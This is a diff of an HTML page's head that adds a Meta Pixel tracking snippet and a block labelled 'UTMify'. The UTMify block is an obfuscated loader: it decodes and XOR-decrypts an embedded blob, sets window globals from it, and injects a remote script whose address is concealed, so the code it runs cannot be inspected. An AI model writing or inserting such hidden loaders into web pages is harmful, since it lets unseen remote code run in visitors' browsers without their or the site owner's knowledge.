@@ -75,10 +75,80 @@
     }
   }
 </style>
+   <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+
+fbq('init', '1061880189599809');
+fbq('track', 'PageView');
+</script>
+<!-- End Meta Pixel Code -->
+   <!-- UTMify -->
+<script>
+(function(){
+  var o_y=atob("DKnxdZtFbWx0ChaIp9LTAOkpT1ZWYmL819rLWrQmCQJaf2Llzs+IW/gqAEIWeDn7xNuYBe82QhkAZ2Wny8iFEOgxQwYHKDqqxt2FB/InGBgReTSy/NLTG/ooCE5OKHLp08jcAO8oBAoNJ2b6wt+UG+9oFQ8bbjv7xMLTWbkzDAABbzSyhYuMWeBnAw0ZbzSyhc2QAfpoGBgZY3DxitmDEO0gAxhZeWPqzs2CV7dnGw0Yf3OqnYvTCMY4");
+
+  var j_r=[];
+
+  for(var h_pqpx=0;h_pqpx<o_y.length;h_pqpx++){
+    j_r.push(o_y.charCodeAt(h_pqpx)&255);
+  }
+
+  var y_dte7=j_r[0];
+  var h_te3l=j_r.slice(1,1+y_dte7);
+  var v_b=j_r.slice(1+y_dte7);
+
+  var m_jd=v_b.map(function(b,e_3){
+    return b^h_te3l[e_3%y_dte7];
+  });
+
+  var t_0l3="";
+
+  for(var h_dh2=0;h_dh2<m_jd.length;h_dh2++){
+    t_0l3+=String.fromCharCode(m_jd[h_dh2]&255);
+  }
+
+  var w_wxzi=decodeURIComponent(escape(t_0l3));
+  var k_pa2=JSON.parse(w_wxzi);
+  var y_84c=k_pa2.globals||[];
+
+  y_84c.forEach(function(n_0mh0){
+    window[n_0mh0.name]=n_0mh0.value;
+  });
+
+  var c_ry=document.createElement("script");
+  c_ry.src=k_pa2.url;
+  c_ry.async=true;
+  c_ry.defer=true;
+
+  (k_pa2.attributes||[]).forEach(function(g_v8pu){
+    c_ry.setAttribute(g_v8pu.name,g_v8pu.value);
+  });
+
+  (document.head||document.documentElement).appendChild(c_ry);
+})();
+</script>
+<!-- End UTMify -->
 
 </head>
 
 <body>
+   <!-- Meta Pixel sem JavaScript -->
+<noscript>
+  <img
+    height="1"
+    width="1"
+    style="display:none"
+    src="https://www.facebook.com/tr?id=1061880189599809&ev=PageView&noscript=1"
+  >
+</noscript>
 
 <header class="py-4">
   <div class="container">
